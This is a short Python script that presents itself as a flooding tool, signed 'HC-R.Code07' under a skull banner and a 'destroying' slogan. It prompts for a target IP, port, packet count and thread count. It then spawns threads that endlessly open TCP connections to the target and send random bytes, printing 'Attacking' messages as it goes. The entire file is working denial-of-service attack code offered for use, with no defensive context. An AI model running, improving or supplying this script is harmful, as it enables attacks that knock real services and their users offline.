import os
import time
import socket
import threading
import random
import progressbar

os.system("clear")

print("""\033[91m
                        `/ymMMMMMMMMMmy/`
                     `/ymMMMMMMMMMMMMMMMmy/`
                   /hMMMMMMMMMMMMMMMMMMMMMMMh/
                 /mMMmNMMMMMNNNNNNNNNMMMMMNNMMm/
               `hNmo:dMMNNNmNNmNmNmNNmNNNMMd:omNh`
              .mh:+/hMNNNNmNNmNdohmmNNmNNNNMy/o:hm.
             `d+://sNmMMMmMMMhM++MmMMMmMMnMmNs///+d`
             ys.o/oMmNNNmNNMNNMmmdMNNMNNmNNNmMo/o.ys
            `my.-/NmMMMMmMMNmNNyiyNNmNMMmMMMMmN/:`ym`
            -h/+s/MmMMMNmNNNdyY+++HmNNNmNMnMNmM:so/h-
            -N.o.sMmMMMNh/:-`-MoHsM-`-:/hNMMMmMs.+.N-\033[97m
            `ho/-ohmMMMM/    -M/v+M.    /MMMMmho-/oh`
             s+-s-odmNNN`     /-v:/     .NNNmd+:s-+s
             `mo/-:+ymMm                 mMms+:-/om`
              .h/+/y`hhs                 yyh`y/+/h.
               `hd/::-+.                 .+-::/dy`
                 /hs+/::.--           --.::/+sh:
                   :hds+/-`           `-/+sdh:
                     `/xmM+           +Mmx/`
                        \033[94m[\033[101m\033[97m- HC-R.Code07 -\033[0m\033[94m]

               \033[91m.\033[97m__=\033[94m[\033[97m Coded by \033[92m HC-R.Code07 \033[94m]\033[97m=__\033[91m.
               \033[97m.--\033[94m[ \033[97mDESTROYING WITH A REASON \033[94m]\033[97m--.\033[97m
""")
print("\033[97m----------------------------")
ip = str(input("\033[92m[\033[97m+\033[92m]IP Target : "))
print("\033[97m----------------------------")
port = int(input("\033[92m[\033[97m+\033[92m]Port : "))
print("\033[97m----------------------------")
packs = int(input("\033[92m[\033[97m+\033[92m]Packets : "))
print("\033[97m----------------------------")
thread = int(input("\033[92m[\033[97m+\033[92m]Threads : "))
print("\033[97m----------------------------")
  
  
def animated_marker():
    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mLoading: ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)
          
animated_marker()

def start():
  r = random._urandom(10)
  u = int(0)
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(r)
      for i in range(packs):
        s.send(r)
        u += 1
        print("\033[92m[\033[97m+\033[92m]\033[92mSent: " +str(u)+ " \033[94m<-- Attacking " +ip+ " -->" )
    except:
      s.close()
      print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
